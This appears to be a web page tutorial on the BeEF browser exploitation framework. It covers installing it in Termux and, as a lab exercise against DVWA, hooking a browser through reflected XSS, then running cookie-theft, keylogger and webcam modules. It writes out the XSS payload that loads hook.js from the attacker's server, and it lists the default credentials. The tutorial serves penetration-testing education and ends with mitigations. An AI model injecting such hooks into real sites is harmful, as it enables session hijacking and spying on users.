      <h2>BeEF (Browser Exploitation Framework)</h2>
      <p>BeEF (Browser Exploitation Framework) is an open-source penetration testing tool developed by Wade Alcorn and maintained by the BeEF project community. It focuses on client-side attacks by "hooking" web browsers through cross-site scripting (XSS), malicious links, or social engineering vectors. Once a browser is hooked, BeEF provides a powerful command-and-control interface to execute JavaScript modules, fingerprint the browser/environment, steal session cookies, access WebRTC/camera/microphone (with permission), perform keylogging, exploit browser vulnerabilities, and demonstrate the impact of client-side compromise. BeEF is widely used in authorized red team engagements to evaluate browser security, XSS impact, and user interaction with malicious content.</p>

      <h3>Uses</h3>
      <p>BeEF is employed in ethical penetration testing to simulate real-world browser-based attacks, assess the effectiveness of XSS mitigations, demonstrate the dangers of reflected/stored XSS, and evaluate endpoint/user awareness. Example: Hooking a test browser via an injected XSS payload in a vulnerable web application, then using BeEF modules to extract session tokens, capture keystrokes, or deliver further payloads in a controlled lab environment.</p>
      <h3>Installation in Termux</h3>
      <p>BeEF is Ruby-based and runs as a web server. It installs cleanly in Termux with Ruby, Bundler, and network dependencies. Steps:</p>
      <pre><code>pkg update && pkg upgrade -y
pkg install git ruby build-essential libsqlite-dev libreadline-dev libssl-dev -y
gem install bundler
git clone https://github.com/beefproject/beef.git
cd beef
bundle install
# Optional: Edit config.yaml (default bind to 0.0.0.0:3000, change hook URL if needed)
# Launch: ./beef
# Access UI: http://localhost:3000/ui/panel (or your Termux IP:3000 from another device)</code></pre>
      <p>Common issues: Port 3000 blocked—edit config.yaml to use another port; Ruby gem errors—run bundle update or install missing native extensions; external hooking—ensure Termux device IP is reachable on the network. To uninstall: Remove the beef directory. For production testing, use a Linux VM or desktop for stability and better network reachability.</p>
      <h3>Functions and Walkthroughs</h3>
      <p>Start BeEF: <code>./beef</code>. Access control panel at http://<your-ip>:3000/ui/panel (default credentials: beef/beef). Hook a browser: Include the hook.js script in a vulnerable page (<script src="http://<beef-ip>:3000/hook.js"></script>) or send a malicious link. Once hooked, the browser appears as a "zombie" in the UI. Execute modules: Right-click zombie → Commands → Select category (Browser, Social Engineering, Exploits, etc.) → Choose module (e.g., Get Cookie, Keylogger, Webcam Snap). Monitor results in real time. Always test in isolated labs with explicit permission.</p>

      <h3>Detailed Tutorial: Browser Hooking via Reflected XSS (Ethical Lab Scenario)</h3>
      <p>This tutorial demonstrates using BeEF to hook a browser via a reflected XSS vulnerability in a deliberately vulnerable test application (e.g., DVWA, bWAPP, or a custom lab page you own). This procedure is permitted only in authorized environments with explicit written permission. Unauthorized XSS exploitation or browser hooking is illegal.</p>
      <ol>
        <li>Start BeEF server: In Termux, navigate to the beef directory and run <code>./beef</code>. Note the hook URL (e.g., http://192.168.1.50:3000/hook.js) and UI access (http://192.168.1.50:3000/ui/panel).</li>
        <li>Prepare vulnerable target: Deploy a test application with a reflected XSS vulnerability (e.g., DVWA set to Low security → XSS (Reflected) page). Confirm the parameter (e.g., ?name=) reflects input unsanitized.</li>
        <li>Craft XSS payload: Use a simple script tag that loads BeEF hook:
          <code><script src="http://192.168.1.50:3000/hook.js"></script></code>
          URL example: http://target-ip/dvwa/vulnerabilities/xss_r/?name=<script src="http://192.168.1.50:3000/hook.js"></code></li>
        <li>Trigger the hook: Open the crafted URL in a test browser (preferably a virtual machine or isolated profile). If successful, BeEF UI shows a new hooked zombie under Online Browsers.</li>
        <li>Interact with hooked browser: In BeEF UI, select the zombie → Commands tab → Social Engineering → Fake Notification Bar (or Browser → Get Cookie, Keylogger, Man Left in Browser, etc.). Execute the module and observe results in the Command Results tab.</li>
        <li>Execute advanced actions (lab only): Try modules such as Webcam Snap (requests permission), Get Clipboard, or Browser Details to gather fingerprint information (user agent, plugins, screen resolution, etc.).</li>
        <li>Stop and document: Close the browser tab to unhook or kill BeEF process (Ctrl+C). Document the attack chain, captured data (if any), and recommend mitigations: Content Security Policy (CSP), input/output encoding, HttpOnly/Secure cookies, X-XSS-Protection, and user awareness training.</li>
      </ol>
      <p>Expected results: Successful browser hook within seconds of loading the XSS payload, followed by real-time command execution and information retrieval from the test browser. Common issues: Browser blocking hook.js (CSP, adblockers)—disable protections in lab; network reachability—ensure attacker IP is accessible from victim; HTTPS mismatch—use HTTP for lab simplicity or configure SSL in BeEF.</p>
